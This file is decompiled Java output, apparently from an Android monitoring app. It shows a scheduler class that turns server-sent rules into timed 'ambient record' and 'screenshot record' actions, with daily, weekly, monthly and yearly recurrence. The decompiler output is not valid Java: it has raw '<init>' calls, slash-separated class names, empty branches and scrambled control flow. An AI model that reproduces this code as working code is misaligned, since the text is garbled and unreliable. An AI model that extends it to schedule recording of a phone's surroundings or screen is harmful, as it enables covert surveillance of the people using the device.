package com.vvt.temporalcontrol;

import com.vvt.base.FxActionParameter;
import com.vvt.base.FxAmbientRecordActionParameter;
import com.vvt.base.FxScreenshotRecordActionParameter;
import com.vvt.phoenix.prot.command.a.n;
import com.vvt.phoenix.prot.command.data.Criteria;
import com.vvt.phoenix.prot.command.data.Criteria.Recurrence;
import com.vvt.phoenix.prot.command.data.TemporalControl;
import com.vvt.phoenix.prot.command.data.TemporalControl.Action;
import com.vvt.phoenix.prot.command.data.i;
import com.vvt.preference.PrefTemporalControl.TemporalControlInfo;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.GregorianCalendar;

public final class f
{
  private static final boolean a = com.vvt.ak.a.a;
  private static final boolean b = com.vvt.ak.a.c;
  private static final boolean c = com.vvt.ak.a.b;
  private static final boolean d = com.vvt.ak.a.d;
  private static SimpleDateFormat e;
  private static SimpleDateFormat f;
  
  static
  {
    SimpleDateFormat localSimpleDateFormat = new java/text/SimpleDateFormat;
    localSimpleDateFormat.<init>("yyyy-MM-dd HH:mm:ss:SSS");
    e = localSimpleDateFormat;
    localSimpleDateFormat = new java/text/SimpleDateFormat;
    localSimpleDateFormat.<init>("yyyy-MM-dd");
    f = localSimpleDateFormat;
  }
  
  public static int a(String paramString)
  {
    int i = 0;
    Object localObject = paramString.split(":");
    int j = 0;
    String str = null;
    try
    {
      str = localObject[0];
      j = Integer.parseInt(str);
      int k = 1;
      localObject = localObject[k];
      i = Integer.parseInt((String)localObject);
      int m = j * 100;
      i += m;
    }
    catch (NumberFormatException localNumberFormatException)
    {
      for (;;) {}
    }
    catch (ArrayIndexOutOfBoundsException localArrayIndexOutOfBoundsException)
    {
      for (;;) {}
    }
    return i;
  }
  
  public static long a(int paramInt1, int paramInt2, long paramLong)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject = a(paramInt1);
    long l1 = ((GregorianCalendar)localObject).getTimeInMillis();
    GregorianCalendar localGregorianCalendar = a(paramInt2);
    if (paramInt2 == 0)
    {
      localObject = ((GregorianCalendar)localObject).getTime();
      localGregorianCalendar.setTime((Date)localObject);
      int i = 30;
      localGregorianCalendar.add(12, i);
      bool1 = a;
      if (!bool1) {}
    }
    long l2 = localGregorianCalendar.getTimeInMillis();
    bool1 = paramLong < l1;
    long l3;
    if (!bool1)
    {
      l3 = l2 - l1;
      boolean bool2 = b;
      if (!bool2) {}
    }
    for (;;)
    {
      return l3;
      bool1 = d;
      if (bool1) {}
      l3 = 0L;
    }
  }
  
  static ArrayList a(n paramn)
  {
    int i = 0;
    Object localObject1 = null;
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    int j = 0;
    float f1 = 0.0F;
    Object localObject2 = null;
    int k = 0;
    int m = 0;
    float f2 = 0.0F;
    i = paramn.b();
    if (k < i)
    {
      PrefTemporalControl.TemporalControlInfo localTemporalControlInfo = new com/vvt/preference/PrefTemporalControl$TemporalControlInfo;
      localTemporalControlInfo.<init>();
      Object localObject3 = paramn.a(k);
      Object localObject4 = ((TemporalControl)localObject3).a();
      int n = ((TemporalControl.Action)localObject4).getValue();
      localObject1 = ((TemporalControl)localObject3).b();
      Object localObject5 = g.a;
      int i1 = ((TemporalControl.Action)localObject4).ordinal();
      i1 = localObject5[i1];
      label124:
      label127:
      int i2;
      switch (i1)
      {
      default: 
        localObject1 = localObject2;
        localObject4 = ((TemporalControl)localObject3).c();
        localObject2 = g.b;
        localObject5 = ((Criteria)localObject4).a();
        i2 = ((Criteria.Recurrence)localObject5).ordinal();
        j = localObject2[i2];
        switch (j)
        {
        default: 
          j = m;
          f1 = f2;
        }
        break;
      }
      for (;;)
      {
        m = ((Criteria)localObject4).b();
        i2 = ((Criteria)localObject4).c();
        int i3 = ((Criteria)localObject4).d();
        i1 = ((Criteria)localObject4).e();
        String str1 = ((TemporalControl)localObject3).d().trim();
        String str2 = ((TemporalControl)localObject3).e().trim();
        String str3 = ((TemporalControl)localObject3).f().trim();
        localObject3 = ((TemporalControl)localObject3).g().trim();
        localTemporalControlInfo.setAction(n);
        localTemporalControlInfo.setFxActionParameter((FxActionParameter)localObject1);
        localTemporalControlInfo.setRecurrence(j);
        localTemporalControlInfo.setMultiplier(m);
        localTemporalControlInfo.setDaysOfWeek(i2);
        localTemporalControlInfo.setDayOfMonth(i3);
        localTemporalControlInfo.setMonthOfYear(i1);
        localTemporalControlInfo.setDateBegin(str1);
        localTemporalControlInfo.setDateEnd(str2);
        localTemporalControlInfo.setTimeBegin(str3);
        localTemporalControlInfo.setTimeEnd((String)localObject3);
        localArrayList.add(localTemporalControlInfo);
        k += 1;
        m = j;
        f2 = f1;
        localObject2 = localObject1;
        break;
        boolean bool = localObject1 instanceof com.vvt.phoenix.prot.command.data.b;
        if (!bool) {
          break label124;
        }
        localObject1 = (com.vvt.phoenix.prot.command.data.b)localObject1;
        localObject2 = new com/vvt/base/FxAmbientRecordActionParameter;
        ((FxAmbientRecordActionParameter)localObject2).<init>();
        long l = ((com.vvt.phoenix.prot.command.data.b)localObject1).a();
        ((FxAmbientRecordActionParameter)localObject2).setParameterSize(l);
        localObject1 = localObject2;
        break label127;
        bool = localObject1 instanceof i;
        if (!bool) {
          break label124;
        }
        localObject1 = (i)localObject1;
        localObject2 = new com/vvt/base/FxScreenshotRecordActionParameter;
        ((FxScreenshotRecordActionParameter)localObject2).<init>();
        l = ((i)localObject1).a();
        ((FxScreenshotRecordActionParameter)localObject2).setParameterSize(l);
        l = ((i)localObject1).b();
        ((FxScreenshotRecordActionParameter)localObject2).setInterval(l);
        localObject1 = localObject2;
        break label127;
        j = 1;
        f1 = Float.MIN_VALUE;
        continue;
        j = 2;
        f1 = 2.8E-45F;
        continue;
        j = 3;
        f1 = 4.2E-45F;
        continue;
        j = 4;
        f1 = 5.6E-45F;
      }
    }
    return localArrayList;
  }
  
  public static GregorianCalendar a(int paramInt)
  {
    GregorianCalendar localGregorianCalendar = new java/util/GregorianCalendar;
    localGregorianCalendar.<init>();
    int i = paramInt / 100;
    localGregorianCalendar.set(11, i);
    i = paramInt % 100;
    localGregorianCalendar.set(12, i);
    localGregorianCalendar.set(13, 0);
    localGregorianCalendar.set(14, 0);
    return localGregorianCalendar;
  }
  
  static boolean a(PrefTemporalControl.TemporalControlInfo paramTemporalControlInfo, Date paramDate)
  {
    boolean bool1 = true;
    boolean bool2 = a;
    if (bool2) {}
    try
    {
      bool2 = a;
      if (bool2) {}
      localObject1 = paramTemporalControlInfo.getDateBegin();
      boolean bool4 = com.vvt.ag.b.a((String)localObject1);
      if (bool4) {
        break label389;
      }
      localObject2 = f;
      localObject1 = ((SimpleDateFormat)localObject2).parse((String)localObject1);
      localObject2 = localObject1;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        Object localObject2;
        long l1;
        long l2;
        boolean bool5;
        int j;
        boolean bool6;
        int i;
        boolean bool3 = c;
        if (bool3)
        {
          continue;
          localObject2 = paramDate;
        }
      }
    }
    bool2 = a;
    if (bool2) {}
    l1 = paramDate.getTime();
    l2 = ((Date)localObject2).getTime();
    localObject1 = paramTemporalControlInfo.getDateEnd();
    bool2 = com.vvt.ag.b.a((String)localObject1);
    if (bool2)
    {
      bool2 = l1 < l2;
      if (!bool2)
      {
        bool2 = bool1;
        bool5 = a;
        if (bool5) {}
        label113:
        j = paramTemporalControlInfo.getMultiplier();
        bool6 = a;
        if ((bool6) && ((!bool2) || (j <= 0))) {
          break label371;
        }
        i = paramTemporalControlInfo.getRecurrence();
        switch (i)
        {
        }
      }
    }
    for (;;)
    {
      bool3 = a;
      if (bool3) {}
      bool3 = a;
      if (bool3) {}
      return bool1;
      bool3 = false;
      localObject1 = null;
      break;
      localObject1 = e;
      Object localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      String str = paramTemporalControlInfo.getDateEnd();
      localObject3 = ((StringBuilder)localObject3).append(str);
      str = " ";
      localObject3 = ((StringBuilder)localObject3).append(str);
      str = "23:59:59:999";
      localObject3 = ((StringBuilder)localObject3).append(str);
      localObject3 = ((StringBuilder)localObject3).toString();
      localObject1 = ((SimpleDateFormat)localObject1).parse((String)localObject3);
      boolean bool7 = a;
      if (bool7) {}
      long l3 = ((Date)localObject1).getTime();
      bool3 = l1 < l2;
      if (!bool3)
      {
        bool3 = l1 < l3;
        if (!bool3)
        {
          bool3 = bool1;
          break label113;
        }
      }
      bool3 = false;
      localObject1 = null;
      break label113;
      bool1 = a((Date)localObject2, paramDate, j);
      continue;
      bool1 = a((Date)localObject2, paramDate, paramTemporalControlInfo);
      continue;
      bool1 = b((Date)localObject2, paramDate, paramTemporalControlInfo);
      continue;
      bool1 = c((Date)localObject2, paramDate, paramTemporalControlInfo);
      continue;
      label371:
      bool1 = false;
    }
  }
  
  private static boolean a(Date paramDate1, Date paramDate2, int paramInt)
  {
    long l1 = com.vvt.o.a.a(paramDate1, paramDate2);
    long l2 = paramInt;
    l1 %= l2;
    l2 = 0L;
    boolean bool = l1 < l2;
    if (!bool) {}
    for (bool = true;; bool = false) {
      return bool;
    }
  }
  
  private static boolean a(Date paramDate1, Date paramDate2, PrefTemporalControl.TemporalControlInfo paramTemporalControlInfo)
  {
    int i = 1;
    boolean bool1 = false;
    boolean bool2 = a;
    if (bool2) {}
    int j = paramTemporalControlInfo.getDaysOfWeek();
    if (j == 0)
    {
      j = b(com.vvt.o.a.a(paramDate1));
      bool4 = a;
      if (!bool4) {}
    }
    boolean bool4 = a;
    if (bool4) {}
    int k = com.vvt.o.a.a(paramDate2);
    boolean bool5 = a;
    if (bool5) {}
    int m = b(k);
    j &= m;
    Date localDate;
    boolean bool3;
    if (j == m)
    {
      j = i;
      boolean bool6 = a;
      if (bool6) {}
      int n = paramTemporalControlInfo.getMultiplier();
      boolean bool7 = a;
      if ((!bool7) || ((j != 0) && (n > 0)))
      {
        j = com.vvt.o.a.a(paramDate1);
        bool7 = a;
        if (bool7) {}
        long l1 = (k - j) * 86400000L;
        long l2 = paramDate1.getTime();
        l1 += l2;
        localDate = new java/util/Date;
        localDate.<init>(l1);
        l1 = com.vvt.o.a.a(localDate, paramDate2);
        long l3 = n * 7;
        l3 = l1 % l3;
        l1 = 0L;
        bool3 = l3 < l1;
        if (bool3) {
          break label257;
        }
      }
    }
    for (;;)
    {
      bool1 = i;
      bool3 = a;
      if (bool3) {}
      bool3 = a;
      if (bool3) {}
      return bool1;
      bool3 = false;
      localDate = null;
      break;
      label257:
      i = 0;
    }
  }
  
  private static int b(int paramInt)
  {
    int i = 0;
    switch (paramInt)
    {
    }
    for (;;)
    {
      return i;
      i = 1;
      continue;
      i = 2;
      continue;
      i = 4;
      continue;
      i = 8;
      continue;
      i = 16;
      continue;
      i = 32;
      continue;
      i = 64;
    }
  }
  
  private static boolean b(Date paramDate1, Date paramDate2, PrefTemporalControl.TemporalControlInfo paramTemporalControlInfo)
  {
    int i = 1;
    boolean bool1 = false;
    boolean bool2 = a;
    if (bool2) {}
    int j = paramTemporalControlInfo.getDayOfMonth();
    boolean bool4 = a;
    if (bool4) {}
    int k = com.vvt.o.a.b(paramDate2);
    boolean bool5 = a;
    if ((!bool5) || (k == j))
    {
      j = i;
      k = paramTemporalControlInfo.getMultiplier();
      if ((j != 0) && (k > 0))
      {
        j = com.vvt.o.a.c(paramDate1);
        int m = com.vvt.o.a.c(paramDate2);
        j = (m - j) % k;
        if (j != 0) {
          break label132;
        }
      }
    }
    for (;;)
    {
      bool1 = i;
      boolean bool3 = a;
      if (bool3) {}
      bool3 = a;
      if (bool3) {}
      return bool1;
      bool3 = false;
      break;
      label132:
      i = 0;
    }
  }
  
  private static boolean c(Date paramDate1, Date paramDate2, PrefTemporalControl.TemporalControlInfo paramTemporalControlInfo)
  {
    int i = 1;
    boolean bool1 = false;
    boolean bool2 = a;
    if (bool2) {}
    int j = paramTemporalControlInfo.getDayOfMonth();
    int k = paramTemporalControlInfo.getMonthOfYear();
    boolean bool4 = a;
    if (bool4) {}
    int m = com.vvt.o.a.b(paramDate2);
    int n = com.vvt.o.a.c(paramDate2);
    boolean bool5 = a;
    if ((!bool5) || ((m == j) && (n == k)))
    {
      j = i;
      k = paramTemporalControlInfo.getMultiplier();
      if ((j != 0) && (k > 0))
      {
        j = com.vvt.o.a.d(paramDate1);
        m = com.vvt.o.a.d(paramDate2);
        j = (m - j) % k;
        if (j != 0) {
          break label151;
        }
      }
    }
    for (;;)
    {
      bool1 = i;
      boolean bool3 = a;
      if (bool3) {}
      bool3 = a;
      if (bool3) {}
      return bool1;
      bool3 = false;
      break;
      label151:
      i = 0;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/temporalcontrol/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */